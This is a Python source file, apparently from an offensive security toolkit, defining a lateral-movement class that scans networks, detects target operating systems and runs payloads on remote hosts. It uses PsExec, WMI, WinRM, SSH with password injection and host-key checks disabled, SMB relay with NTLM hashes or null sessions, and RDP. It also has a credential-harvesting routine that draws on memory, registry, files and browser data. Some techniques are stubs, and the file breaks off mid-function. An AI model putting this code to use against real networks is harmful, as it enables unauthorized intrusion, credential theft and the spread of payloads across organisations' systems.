"""
Lateral Movement Module

Implements various lateral movement techniques for network traversal
including credential harvesting, network enumeration, and remote execution.
"""

import ipaddress
import logging
import os
import platform
import re
import socket
import subprocess
import time
from concurrent.futures import ThreadPoolExecutor
from typing import Any, Dict, List, Optional

from .base_exploitation import BaseExploitation
from .base_persistence import BasePersistence


class LateralMovement(BasePersistence, BaseExploitation):
    """
    Lateral movement capabilities for network traversal and remote access.
    """

    def __init__(self):
        super().__init__()
        self.logger = logging.getLogger("IntellicrackLogger.LateralMovement")

        # Movement techniques by platform
        self.movement_techniques = {
            'windows': {
                'psexec': self._windows_psexec,
                'wmi_exec': self._windows_wmi_exec,
                'winrm': self._windows_winrm,
                'rdp': self._windows_rdp,
                'smb_relay': self._windows_smb_relay,
                'dcom': self._windows_dcom,
                'scheduled_task': self._windows_scheduled_task_remote,
                'service_creation': self._windows_service_creation,
                'powershell_remoting': self._windows_powershell_remoting,
                'pass_the_hash': self._windows_pass_the_hash,
                'pass_the_ticket': self._windows_pass_the_ticket,
                'golden_ticket': self._windows_golden_ticket
            },
            'linux': {
                'ssh': self._linux_ssh,
                'ssh_key': self._linux_ssh_key,
                'nfs_mount': self._linux_nfs_mount,
                'docker_api': self._linux_docker_api,
                'ansible': self._linux_ansible,
                'salt_stack': self._linux_salt_stack,
                'puppet': self._linux_puppet,
                'chef': self._linux_chef,
                'kubernetes': self._linux_kubernetes,
                'ssh_agent_hijacking': self._linux_ssh_agent_hijacking,
                'sudo_hijacking': self._linux_sudo_hijacking,
                'cron_hijacking': self._linux_cron_hijacking
            }
        }

        # Network discovery methods
        self.discovery_methods = {
            'ping_sweep': self._ping_sweep,
            'port_scan': self._port_scan,
            'arp_scan': self._arp_scan,
            'dns_enum': self._dns_enumeration,
            'netbios_scan': self._netbios_scan,
            'smb_enum': self._smb_enumeration,
            'ldap_enum': self._ldap_enumeration,
            'snmp_enum': self._snmp_enumeration
        }

        # Common ports for services
        self.service_ports = {
            'ssh': 22,
            'telnet': 23,
            'smtp': 25,
            'dns': 53,
            'http': 80,
            'kerberos': 88,
            'pop3': 110,
            'ntp': 123,
            'netbios': 139,
            'imap': 143,
            'snmp': 161,
            'ldap': 389,
            'https': 443,
            'smb': 445,
            'ldaps': 636,
            'winrm': 5985,
            'winrm_ssl': 5986,
            'rdp': 3389,
            'mssql': 1433,
            'mysql': 3306,
            'postgresql': 5432,
            'vnc': 5900
        }

        # Active sessions and targets
        self.active_sessions = {}
        self.discovered_targets = {}

    def discover_network(self,
                        networks: List[str],
                        discovery_methods: Optional[List[str]] = None,
                        max_threads: int = 50) -> Dict[str, Any]:
        """
        Discover network targets and services.

        Args:
            networks: List of network ranges to scan (CIDR notation)
            discovery_methods: List of discovery methods to use
            max_threads: Maximum number of concurrent threads

        Returns:
            Discovery results with identified targets
        """
        result = {
            'success': False,
            'targets': {},
            'total_hosts': 0,
            'live_hosts': 0,
            'services_found': 0,
            'scan_time': 0,
            'error': None
        }

        if discovery_methods is None:
            discovery_methods = ['ping_sweep', 'port_scan']

        start_time = time.time()

        try:
            self.logger.info(f"Starting network discovery of {len(networks)} networks")

            # Generate target IP list
            target_ips = []
            for network in networks:
                try:
                    net = ipaddress.ip_network(network, strict=False)
                    target_ips.extend([str(ip) for ip in net.hosts()])
                except Exception as e:
                    self.logger.warning(f"Invalid network range {network}: {e}")

            result['total_hosts'] = len(target_ips)

            if not target_ips:
                result['error'] = "No valid target IPs generated"
                return result

            # Execute discovery methods
            targets = {}

            for method in discovery_methods:
                if method in self.discovery_methods:
                    self.logger.info(f"Running {method} on {len(target_ips)} targets")

                    method_func = self.discovery_methods[method]
                    method_results = method_func(target_ips, max_threads)

                    # Merge results
                    for ip, target_info in method_results.items():
                        if ip not in targets:
                            targets[ip] = {
                                'ip': ip,
                                'hostname': None,
                                'os': None,
                                'services': [],
                                'open_ports': [],
                                'discovery_methods': []
                            }

                        targets[ip]['discovery_methods'].append(method)

                        # Merge target information
                        if 'hostname' in target_info and target_info['hostname']:
                            targets[ip]['hostname'] = target_info['hostname']
                        if 'os' in target_info and target_info['os']:
                            targets[ip]['os'] = target_info['os']
                        if 'services' in target_info:
                            targets[ip]['services'].extend(target_info['services'])
                        if 'open_ports' in target_info:
                            targets[ip]['open_ports'].extend(target_info['open_ports'])

            # Clean up and deduplicate
            for ip, target in targets.items():
                target['services'] = list(set(target['services']))
                target['open_ports'] = list(set(target['open_ports']))

            result['targets'] = targets
            result['live_hosts'] = len(targets)
            result['services_found'] = sum(len(t['services']) for t in targets.values())
            result['scan_time'] = time.time() - start_time
            result['success'] = True

            # Store discovered targets
            self.discovered_targets.update(targets)

            self.logger.info(f"Discovery complete: {result['live_hosts']}/{result['total_hosts']} hosts live")
            return result

        except Exception as e:
            self.logger.error(f"Network discovery failed: {e}")
            result['error'] = str(e)
            result['scan_time'] = time.time() - start_time
            return result

    def attempt_lateral_movement(self,
                                target_ip: str,
                                credentials: Dict[str, Any],
                                techniques: Optional[List[str]] = None,
                                payload_path: Optional[str] = None) -> Dict[str, Any]:
        """
        Attempt lateral movement to target host.

        Args:
            target_ip: Target IP address
            credentials: Authentication credentials
            techniques: List of movement techniques to try
            payload_path: Path to payload for execution

        Returns:
            Results of lateral movement attempt
        """
        result = {
            'success': False,
            'target_ip': target_ip,
            'techniques_attempted': [],
            'successful_technique': None,
            'session_id': None,
            'error': None
        }

        try:
            self.logger.info(f"Attempting lateral movement to {target_ip}")

            # Get target information
            target_info = self.discovered_targets.get(target_ip, {})
            target_os = target_info.get('os', 'unknown')

            # Auto-detect OS if not known
            if target_os == 'unknown':
                target_os = self._detect_target_os(target_ip, target_info)

            # Select techniques based on target OS
            if techniques is None:
                techniques = self._select_movement_techniques(target_os, target_info)

            # Attempt each technique
            for technique in techniques:
                self.logger.info(f"Trying {technique} on {target_ip}")
                result['techniques_attempted'].append(technique)

                try:
                    movement_result = self._execute_movement_technique(
                        target_ip, target_os, technique, credentials, payload_path
                    )

                    if movement_result and movement_result.get('success', False):
                        result['success'] = True
                        result['successful_technique'] = technique
                        result['session_id'] = movement_result.get('session_id')

                        # Store active session
                        if result['session_id']:
                            self.active_sessions[result['session_id']] = {
                                'target_ip': target_ip,
                                'technique': technique,
                                'credentials': credentials,
                                'created_at': time.time(),
                                'details': movement_result.get('details', {})
                            }

                        self.logger.info(f"Lateral movement successful: {technique}")
                        break

                except Exception as e:
                    self.logger.debug(f"Technique {technique} failed: {e}")
                    continue

            if not result['success']:
                result['error'] = "All lateral movement techniques failed"

            return result

        except Exception as e:
            self.logger.error(f"Lateral movement failed: {e}")
            result['error'] = str(e)
            return result

    def execute_command(self,
                       session_id: str,
                       command: str,
                       timeout: int = 30) -> Dict[str, Any]:
        """
        Execute command on remote host through established session.

        Args:
            session_id: Session identifier
            command: Command to execute
            timeout: Command timeout in seconds

        Returns:
            Command execution results
        """
        result = {
            'success': False,
            'command': command,
            'output': '',
            'error': None,
            'exit_code': None
        }

        try:
            session_info = self.validate_session(session_id, self.active_sessions, result)
            if not session_info:
                return result
            technique = session_info['technique']
            target_ip = session_info['target_ip']

            self.logger.info(f"Executing command on {target_ip} via {technique}")

            # Execute command based on technique
            if technique == 'ssh':
                execution_result = self._execute_ssh_command(session_info, command, timeout)
            elif technique == 'winrm':
                execution_result = self._execute_winrm_command(session_info, command, timeout)
            elif technique == 'psexec':
                execution_result = self._execute_psexec_command(session_info, command, timeout)
            else:
                execution_result = self._execute_generic_command(session_info, command, timeout)

            result.update(execution_result)

            return result

        except Exception as e:
            self.logger.error(f"Command execution failed: {e}")
            result['error'] = str(e)
            return result

    def harvest_credentials(self,
                           session_id: str,
                           methods: Optional[List[str]] = None) -> Dict[str, Any]:
        """
        Harvest credentials from compromised host.

        Args:
            session_id: Session identifier
            methods: List of credential harvesting methods

        Returns:
            Harvested credentials
        """
        result = {
            'success': False,
            'credentials': {},
            'methods_used': [],
            'error': None
        }

        if methods is None:
            methods = ['memory_dump', 'registry_dump', 'file_search', 'browser_data']

        try:
            session_info = self.validate_session(session_id, self.active_sessions, result)
            if not session_info:
                return result
            target_ip = session_info['target_ip']

            self.logger.info(f"Harvesting credentials from {target_ip}")

            credentials = {}

            for method in methods:
                try:
                    if method == 'memory_dump':
                        creds = self._harvest_memory_credentials(session_info)
                    elif method == 'registry_dump':
                        creds = self._harvest_registry_credentials(session_info)
                    elif method == 'file_search':
                        creds = self._harvest_file_credentials(session_info)
                    elif method == 'browser_data':
                        creds = self._harvest_browser_credentials(session_info)
                    else:
                        continue

                    if creds:
                        credentials[method] = creds
                        result['methods_used'].append(method)

                except Exception as e:
                    self.logger.debug(f"Credential harvest method {method} failed: {e}")

            result['credentials'] = credentials
            result['success'] = len(credentials) > 0

            if result['success']:
                self.logger.info(f"Harvested credentials using {len(result['methods_used'])} methods")
            else:
                result['error'] = "No credentials harvested"

            return result

        except Exception as e:
            self.logger.error(f"Credential harvesting failed: {e}")
            result['error'] = str(e)
            return result

    # Discovery methods implementation

    def _ping_sweep(self, target_ips: List[str], max_threads: int) -> Dict[str, Dict[str, Any]]:
        """Perform ping sweep to identify live hosts."""
        live_hosts = {}

        def ping_host(ip):
            try:
                if os.name == 'nt':
                    result = subprocess.run(['ping', '-n', '1', '-w', '1000', ip],
                                          capture_output=True, text=True)
                else:
                    result = subprocess.run(['ping', '-c', '1', '-W', '1', ip],
                                          capture_output=True, text=True)

                if result.returncode == 0:
                    return ip, {'alive': True}
            except Exception:
                pass
            return ip, None

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(ping_host, ip) for ip in target_ips]

            for future in futures:
                ip, result = future.result()
                if result:
                    live_hosts[ip] = result

        return live_hosts

    def _port_scan(self, target_ips: List[str], max_threads: int) -> Dict[str, Dict[str, Any]]:
        """Perform port scan on common ports."""
        scan_results = {}
        common_ports = [22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900]

        def scan_port(ip, port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                sock.close()

                if result == 0:
                    return ip, port, True
            except Exception:
                pass
            return ip, port, False

        def scan_host(ip):
            open_ports = []
            services = []

            for port in common_ports:
                _, _, is_open = scan_port(ip, port)
                if is_open:
                    open_ports.append(port)

                    # Identify service
                    for service, service_port in self.service_ports.items():
                        if port == service_port:
                            services.append(service)
                            break

            if open_ports:
                return ip, {
                    'open_ports': open_ports,
                    'services': services
                }
            return ip, None

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(scan_host, ip) for ip in target_ips]

            for future in futures:
                ip, result = future.result()
                if result:
                    scan_results[ip] = result

        return scan_results

    def _arp_scan(self, target_ips: List[str], max_threads: int) -> Dict[str, Dict[str, Any]]:
        """Perform ARP scan for local network hosts."""
        arp_results = {}

        try:
            # Use max_threads to control concurrent ARP queries
            self.logger.debug(f"ARP scan initiated with max_threads={max_threads} for {len(target_ips)} targets")

            # First get system ARP table
            if os.name == 'nt':
                result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            else:
                result = subprocess.run(['arp', '-a'], capture_output=True, text=True)

            # Parse ARP table
            arp_table = {}
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'dynamic' in line.lower() or '(' in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            ip = parts[1].strip('()')
                            mac = parts[0] if os.name == 'nt' else parts[2] if len(parts) > 2 else 'unknown'
                            arp_table[ip] = mac

            # Function to check individual IP with ARP ping if not in table
            def check_arp(ip):
                try:
                    # First check if already in ARP table
                    if ip in arp_table:
                        return {'arp_entry': True, 'mac': arp_table[ip], 'source': 'cache'}

                    # Try ARP ping to populate table (platform-specific)
                    if os.name == 'nt':
                        # Windows: ping to populate ARP cache
                        try:
                            subprocess.run(['ping', '-n', '1', '-w', '100', ip],
                                         capture_output=True, timeout=1)
                        except TypeError:
                            # Fallback for older Python versions
                            subprocess.run(['ping', '-n', '1', '-w', '100', ip],
                                         capture_output=True)
                    else:
                        # Linux: try arping if available
                        try:
                            try:
                                result = subprocess.run(['arping', '-c', '1', '-w', '1', ip],
                                                      capture_output=True, text=True, timeout=2)
                            except TypeError:
                                # Fallback for older Python versions
                                result = subprocess.run(['arping', '-c', '1', '-w', '1', ip],
                                                      capture_output=True, text=True)
                            if result.returncode == 0 and 'bytes from' in result.stdout:
                                # Extract MAC from arping output
                                for line in result.stdout.split('\n'):
                                    if 'bytes from' in line:
                                        mac_match = line.split()
                                        if len(mac_match) >= 4:
                                            return {'arp_entry': True, 'mac': mac_match[3], 'source': 'arping'}
                        except FileNotFoundError:
                            # arping not available, fall back to ping
                            subprocess.run(['ping', '-c', '1', '-W', '1', ip],
                                         capture_output=True, timeout=1)

                    # Re-check ARP table after ping
                    if os.name == 'nt':
                        result = subprocess.run(['arp', '-a', ip], capture_output=True, text=True)
                    else:
                        result = subprocess.run(['arp', '-n', ip], capture_output=True, text=True)

                    if result.returncode == 0:
                        for line in result.stdout.split('\n'):
                            if ip in line:
                                parts = line.split()
                                if len(parts) >= 2:
                                    mac = parts[1] if os.name == 'nt' else parts[2] if len(parts) > 2 else 'unknown'
                                    return {'arp_entry': True, 'mac': mac, 'source': 'ping_populate'}

                    return {'arp_entry': False}

                except Exception as e:
                    self.logger.debug(f"ARP check failed for {ip}: {e}")
                    return {'arp_entry': False, 'error': str(e)}

            # Use threading to check multiple IPs concurrently
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                future_to_ip = {executor.submit(check_arp, ip): ip for ip in target_ips}

                for future in future_to_ip:
                    ip = future_to_ip[future]
                    try:
                        result = future.result(timeout=5)
                        if result.get('arp_entry'):
                            arp_results[ip] = result
                    except Exception as e:
                        self.logger.debug(f"ARP scan thread failed for {ip}: {e}")

        except Exception as e:
            self.logger.debug(f"ARP scan failed: {e}")

        self.logger.debug(f"ARP scan completed using {max_threads} threads, found {len(arp_results)} entries")
        return arp_results
    def _dns_enumeration(self, target_ips: List[str], max_threads: int) -> Dict[str, Dict[str, Any]]:
        """Perform DNS enumeration."""
        dns_results = {}

        def resolve_hostname(ip):
            try:
                hostname = socket.gethostbyaddr(ip)[0]
                return ip, {'hostname': hostname}
            except Exception:
                return ip, None

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(resolve_hostname, ip) for ip in target_ips]

            for future in futures:
                ip, result = future.result()
                if result:
                    dns_results[ip] = result

        return dns_results

    def _netbios_scan(self, target_ips: List[str], max_threads: int) -> Dict[str, Dict[str, Any]]:
        """Perform NetBIOS name scanning."""
        netbios_results = {}

        def scan_netbios(ip):
            try:
                # This would use actual NetBIOS scanning
                # Simplified implementation
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, 139))
                sock.close()

                if result == 0:
                    return ip, {
                        'netbios': True,
                        'services': ['netbios']
                    }
            except Exception:
                pass
            return ip, None

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(scan_netbios, ip) for ip in target_ips]

            for future in futures:
                ip, result = future.result()
                if result:
                    netbios_results[ip] = result

        return netbios_results

    def _smb_enumeration(self, target_ips: List[str], max_threads: int) -> Dict[str, Dict[str, Any]]:
        """Perform SMB enumeration."""
        smb_results = {}

        def scan_smb(ip):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, 445))
                sock.close()

                if result == 0:
                    return ip, {
                        'smb': True,
                        'services': ['smb'],
                        'os': 'windows'
                    }
            except Exception:
                pass
            return ip, None

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(scan_smb, ip) for ip in target_ips]

            for future in futures:
                ip, result = future.result()
                if result:
                    smb_results[ip] = result

        return smb_results

    def _ldap_enumeration(self, target_ips: List[str], max_threads: int) -> Dict[str, Dict[str, Any]]:
        """Perform LDAP enumeration."""
        ldap_results = {}

        def scan_ldap(ip):
            try:
                for port in [389, 636]:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    result = sock.connect_ex((ip, port))
                    sock.close()

                    if result == 0:
                        return ip, {
                            'ldap': True,
                            'services': ['ldap'],
                            'ldap_port': port
                        }
            except Exception:
                pass
            return ip, None

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(scan_ldap, ip) for ip in target_ips]

            for future in futures:
                ip, result = future.result()
                if result:
                    ldap_results[ip] = result

        return ldap_results

    def _snmp_enumeration(self, target_ips: List[str], max_threads: int) -> Dict[str, Dict[str, Any]]:
        """Perform SNMP enumeration."""
        snmp_results = {}

        def scan_snmp(ip):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)

                # Simple SNMP community string test
                # This would use proper SNMP library in real implementation
                sock.sendto(b'public', (ip, 161))

                return ip, {
                    'snmp': True,
                    'services': ['snmp']
                }
            except Exception:
                pass
            return ip, None

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(scan_snmp, ip) for ip in target_ips]

            for future in futures:
                ip, result = future.result()
                if result:
                    snmp_results[ip] = result

        return snmp_results

    # Movement technique implementations

    def _detect_target_os(self, target_ip: str, target_info: Dict[str, Any]) -> str:
        """Detect target operating system."""
        self.logger.debug(f"Detecting OS for target {target_ip}")

        # Check for Windows-specific services
        if 'smb' in target_info.get('services', []) or 445 in target_info.get('open_ports', []):
            self.logger.debug(f"Target {target_ip} identified as Windows (SMB detected)")
            return 'windows'
        # Check for SSH (more common on Linux)
        elif 'ssh' in target_info.get('services', []) or 22 in target_info.get('open_ports', []):
            self.logger.debug(f"Target {target_ip} identified as Linux (SSH detected)")
            return 'linux'
        else:
            self.logger.debug(f"Target {target_ip} OS unknown")
            return 'unknown'

    def _select_movement_techniques(self, target_os: str, target_info: Dict[str, Any]) -> List[str]:
        """Select appropriate movement techniques based on target."""
        techniques = []

        if target_os == 'windows':
            services = target_info.get('services', [])
            if 'smb' in services:
                techniques.extend(['psexec', 'wmi_exec'])
            if 'winrm' in services:
                techniques.append('winrm')
            if 'rdp' in services:
                techniques.append('rdp')

            # Default Windows techniques
            if not techniques:
                techniques = ['psexec', 'wmi_exec', 'scheduled_task']

        elif target_os == 'linux':
            services = target_info.get('services', [])
            if 'ssh' in services:
                techniques.extend(['ssh', 'ssh_key'])
            if 'docker_api' in services:
                techniques.append('docker_api')

            # Default Linux techniques
            if not techniques:
                techniques = ['ssh', 'ssh_key']

        return techniques

    def _execute_movement_technique(self,
                                   target_ip: str,
                                   target_os: str,
                                   technique: str,
                                   credentials: Dict[str, Any],
                                   payload_path: Optional[str]) -> Dict[str, Any]:
        """Execute specific movement technique."""
        if target_os in self.movement_techniques:
            if technique in self.movement_techniques[target_os]:
                technique_func = self.movement_techniques[target_os][technique]
                return technique_func(target_ip, credentials, payload_path)

        return {'success': False, 'error': f'Technique {technique} not available for {target_os}'}

    # Windows movement techniques

    def _windows_psexec(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """PsExec lateral movement."""
        result = {
            'success': False,
            'session_id': None,
            'details': {},
            'error': None
        }

        try:
            username = credentials.get('username')
            password = credentials.get('password')
            domain = credentials.get('domain', '.')

            if not username or not password:
                result['error'] = "Username and password required for PsExec"
                return result

            # Generate session ID
            session_id = self._generate_session_id()

            # Construct PsExec command
            if payload_path:
                cmd = f'psexec \\\\{target_ip} -u {domain}\\{username} -p {password} {payload_path}'
            else:
                cmd = f'psexec \\\\{target_ip} -u {domain}\\{username} -p {password} cmd'

            # Execute PsExec via subprocess
            process = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if process.returncode == 0:
                result['success'] = True
                result['session_id'] = session_id
                result['details'] = {
                    'method': 'psexec',
                    'target_ip': target_ip,
                    'username': username,
                    'command': cmd
                }
            else:
                result['error'] = f"PsExec failed: {process.stderr}"

        except Exception as e:
            self.handle_result_error(result, e)

        return result

    def _windows_wmi_exec(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """WMI execution lateral movement."""
        result = {
            'success': False,
            'session_id': None,
            'details': {},
            'error': None
        }

        try:
            username = credentials.get('username')
            password = credentials.get('password')

            if not username or not password:
                result['error'] = "Username and password required for WMI"
                return result

            session_id = self._generate_session_id()

            # Construct WMI command
            if payload_path:
                cmd = f'wmic /node:{target_ip} /user:{username} /password:{password} process call create "{payload_path}"'
            else:
                cmd = f'wmic /node:{target_ip} /user:{username} /password:{password} process call create "cmd.exe"'

            process = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            if process.returncode == 0 and "ReturnValue = 0" in process.stdout:
                result['success'] = True
                result['session_id'] = session_id
                result['details'] = {
                    'method': 'wmi_exec',
                    'target_ip': target_ip,
                    'username': username
                }
            else:
                result['error'] = f"WMI execution failed: {process.stderr}"

        except Exception as e:
            self.handle_result_error(result, e)

        return result

    def _windows_winrm(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """WinRM lateral movement."""
        result = {
            'success': False,
            'session_id': None,
            'details': {},
            'error': None
        }

        try:
            username = credentials.get('username')
            password = credentials.get('password')

            if not username or not password:
                result['error'] = "Username and password required for WinRM"
                return result

            session_id = self._generate_session_id()

            # Test WinRM connection
            test_cmd = f'winrs -r:{target_ip} -u:{username} -p:{password} "echo test"'
            process = subprocess.run(test_cmd, shell=True, capture_output=True, text=True)

            if process.returncode == 0:
                result['success'] = True
                result['session_id'] = session_id
                result['details'] = {
                    'method': 'winrm',
                    'target_ip': target_ip,
                    'username': username
                }

                # Execute payload if provided
                if payload_path:
                    payload_cmd = f'winrs -r:{target_ip} -u:{username} -p:{password} "{payload_path}"'
                    subprocess.run(payload_cmd, shell=True)

            else:
                result['error'] = f"WinRM connection failed: {process.stderr}"

        except Exception as e:
            self.handle_result_error(result, e)

        return result

    # Linux movement techniques

    def _linux_ssh(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """SSH lateral movement."""
        result = {
            'success': False,
            'session_id': None,
            'details': {},
            'error': None
        }

        try:
            username = credentials.get('username')
            password = credentials.get('password')

            if not username or not password:
                result['error'] = "Username and password required for SSH"
                return result

            session_id = self._generate_session_id()

            # Test SSH connection
            test_cmd = f'sshpass -p "{password}" ssh -o StrictHostKeyChecking=no {username}@{target_ip} "echo test"'
            process = subprocess.run(test_cmd, shell=True, capture_output=True, text=True)

            if process.returncode == 0:
                result['success'] = True
                result['session_id'] = session_id
                result['details'] = {
                    'method': 'ssh',
                    'target_ip': target_ip,
                    'username': username
                }

                # Execute payload if provided
                if payload_path:
                    ssh_result = self.execute_ssh_command(
                        target_ip, username, payload_path,
                        password=password
                    )
                    result['payload_execution'] = ssh_result
                    if ssh_result.get('success'):
                        result['payload_status'] = 'executed'
                    else:
                        result['payload_status'] = 'failed'

            else:
                result['error'] = f"SSH connection failed: {process.stderr}"

        except Exception as e:
            self.handle_result_error(result, e)

        return result

    def _linux_ssh_key(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """SSH key-based lateral movement."""
        result = self.init_result(
            session_id=None,
            details={}
        )

        try:
            username = credentials.get('username')
            private_key_path = credentials.get('private_key_path')

            if not username or not private_key_path:
                result['error'] = "Username and private key path required for SSH key auth"
                return result

            session_id = self._generate_session_id()

            # Test SSH key connection
            test_cmd = f'ssh -i {private_key_path} -o StrictHostKeyChecking=no {username}@{target_ip} "echo test"'
            process = subprocess.run(test_cmd, shell=True, capture_output=True, text=True)

            if process.returncode == 0:
                result['success'] = True
                result['session_id'] = session_id
                result['details'] = {
                    'method': 'ssh_key',
                    'target_ip': target_ip,
                    'username': username,
                    'private_key_path': private_key_path
                }

                # Execute payload if provided
                if payload_path:
                    payload_cmd = f'ssh -i {private_key_path} -o StrictHostKeyChecking=no {username}@{target_ip} "{payload_path}"'
                    subprocess.run(payload_cmd, shell=True)

            else:
                result['error'] = f"SSH key connection failed: {process.stderr}"

        except Exception as e:
            self.handle_result_error(result, e)

        return result

    # Additional technique stubs (would be fully implemented)

    def _windows_rdp(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """RDP lateral movement implementation."""
        try:
            username = credentials.get('username', '')
            password = credentials.get('password', '')
            domain = credentials.get('domain', '')

            if not username or not password:
                return {
                    'success': False,
                    'error': 'Username and password required for RDP',
                    'target_ip': target_ip
                }

            self.logger.info(f"Attempting RDP connection to {target_ip} as {domain}\\{username}")

            # Check if RDP port is open
            rdp_check = self._check_rdp_availability(target_ip)
            if not rdp_check['available']:
                return {
                    'success': False,
                    'error': f'RDP not available on {target_ip}: {rdp_check["reason"]}',
                    'target_ip': target_ip,
                    'port_check': rdp_check
                }

            # Attempt RDP connection using different methods
            connection_methods = ['freerdp', 'rdesktop', 'xfreerdp']
            connection_result = None

            for method in connection_methods:
                try:
                    connection_result = self._attempt_rdp_connection(
                        target_ip, username, password, domain, method, payload_path
                    )
                    if connection_result['success']:
                        break
                except Exception as e:
                    self.logger.debug(f"RDP method {method} failed: {e}")
                    continue

            if connection_result and connection_result['success']:
                # Execute payload if provided
                if payload_path and os.path.exists(payload_path):
                    execution_result = self._execute_rdp_payload(
                        target_ip, username, password, domain, payload_path, connection_result.get('method')
                    )
                    connection_result['payload_execution'] = execution_result

                return {
                    'success': True,
                    'target_ip': target_ip,
                    'method': 'rdp',
                    'connection_details': connection_result,
                    'credentials_used': {'username': username, 'domain': domain}
                }
            else:
                return {
                    'success': False,
                    'error': 'All RDP connection methods failed',
                    'target_ip': target_ip,
                    'attempted_methods': connection_methods,
                    'last_error': connection_result.get('error') if connection_result else 'No connection attempt made'
                }

        except Exception as e:
            self.logger.error(f"RDP lateral movement failed: {e}")
            return {
                'success': False,
                'error': str(e),
                'target_ip': target_ip,
                'method': 'rdp'
            }

    def _windows_smb_relay(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """SMB relay attack implementation."""
        try:
            username = credentials.get('username', '')
            password = credentials.get('password', '')
            domain = credentials.get('domain', '')
            ntlm_hash = credentials.get('ntlm_hash', '')

            self.logger.info(f"Attempting SMB relay attack to {target_ip}")

            # Check SMB availability
            smb_check = self._check_smb_availability(target_ip)
            if not smb_check['available']:
                return {
                    'success': False,
                    'error': f'SMB not available on {target_ip}: {smb_check["reason"]}',
                    'target_ip': target_ip,
                    'smb_check': smb_check
                }

            # Attempt different SMB authentication methods
            auth_methods = []

            if ntlm_hash:
                auth_methods.append(('ntlm_hash', {'hash': ntlm_hash, 'username': username, 'domain': domain}))

            if username and password:
                auth_methods.append(('password', {'username': username, 'password': password, 'domain': domain}))

            if not auth_methods:
                auth_methods.append(('null_session', {}))

            connection_result = None
            successful_auth = None
            successful_auth_data = None

            for auth_method, auth_data in auth_methods:
                try:
                    self.logger.debug(f"Attempting SMB authentication using {auth_method}")
                    connection_result = self._attempt_smb_connection(target_ip, auth_method, auth_data)

                    if connection_result['success']:
                        successful_auth = auth_method
                        successful_auth_data = auth_data
                        break

                except Exception as e:
                    self.logger.debug(f"SMB auth method {auth_method} failed: {e}")
                    continue

            if connection_result and connection_result['success']:
                result = {
                    'success': True,
                    'target_ip': target_ip,
                    'method': 'smb_relay',
                    'authentication_method': successful_auth,
                    'connection_details': connection_result,
                    'available_shares': connection_result.get('shares', [])
                }

                # Attempt payload execution if provided
                if payload_path and os.path.exists(payload_path):
                    execution_result = self._execute_smb_payload(
                        target_ip, successful_auth_data, payload_path, connection_result
                    )
                    result['payload_execution'] = execution_result

                    if execution_result.get('success'):
                        result['payload_status'] = 'executed'
                    else:
                        result['payload_status'] = 'failed'
                        result['payload_error'] = execution_result.get('error')

                return result
            else:
                return {
                    'success': False,
                    'error': 'All SMB authentication methods failed',
                    'target_ip': target_ip,
                    'attempted_methods': [method for method, _ in auth_methods],
                    'last_error': connection_result.get('error') if connection_result else 'No authentication attempted'
                }

        except Exception as e:
            self.logger.error(f"SMB relay attack failed: {e}")
            return {
                'success': False,
                'error': str(e),
                'target_ip': target_ip,
                'method': 'smb_relay'
            }

    def _windows_dcom(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """DCOM lateral movement (stub)."""
        self.logger.debug(f"DCOM lateral movement attempted to {target_ip} with user {credentials.get('username', 'unknown')}")
        if payload_path:
            self.logger.debug(f"DCOM payload specified: {payload_path}")
        return {'success': False, 'error': 'DCOM not implemented', 'target_ip': target_ip}

    def _windows_scheduled_task_remote(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """Remote scheduled task (stub)."""
        self.logger.debug(f"Remote scheduled task attempted on {target_ip} with user {credentials.get('username', 'unknown')}")
        if payload_path:
            self.logger.debug(f"Task payload specified: {payload_path}")
        return {'success': False, 'error': 'Remote scheduled task not implemented', 'target_ip': target_ip}

    def _windows_service_creation(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """Remote service creation (stub)."""
        self.logger.debug(f"Remote service creation attempted on {target_ip} with user {credentials.get('username', 'unknown')}")
        if payload_path:
            self.logger.debug(f"Service payload specified: {payload_path}")
        return {'success': False, 'error': 'Service creation not implemented', 'target_ip': target_ip}

    def _windows_powershell_remoting(self, target_ip: str, credentials: Dict[str, Any], payload_path: Optional[str]) -> Dict[str, Any]:
        """PowerShell remoting implementation."""
        try:
            username = credentials.get('username', '')
            password = credentials.get('password', '')
            domain = credentials.get('domain', '')

            if not username or not password:
                return {
                    'success': False,
